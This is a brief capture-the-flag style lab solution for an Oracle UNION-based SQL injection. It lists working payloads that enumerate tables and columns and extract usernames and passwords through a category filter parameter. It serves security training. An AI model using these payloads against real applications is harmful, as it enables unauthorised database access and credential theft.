# Lab: SQL injection attack, listing the database contents on Oracle (Practitioner)

**Goal:** Retrieve the administrator password.

## Solution Steps

1. List tables:

```
' UNION SELECT table_name, NULL FROM all_tables--
```

2. List columns:

```
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JBZEMH'--
```

Note: Oracle stores identifiers in UPPERCASE by default.

3. Retrieve data:

```
' UNION SELECT USERNAME_LDCZDH, PASSWORD_WXJANO FROM USERS_JBZEMH--
```

## Key Payloads

```
GET /filter?category=' UNION SELECT table_name, NULL FROM all_tables--
GET /filter?category=' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JBZEMH'--
GET /filter?category=' UNION SELECT USERNAME_LDCZDH, PASSWORD_WXJANO FROM USERS_JBZEMH--
```
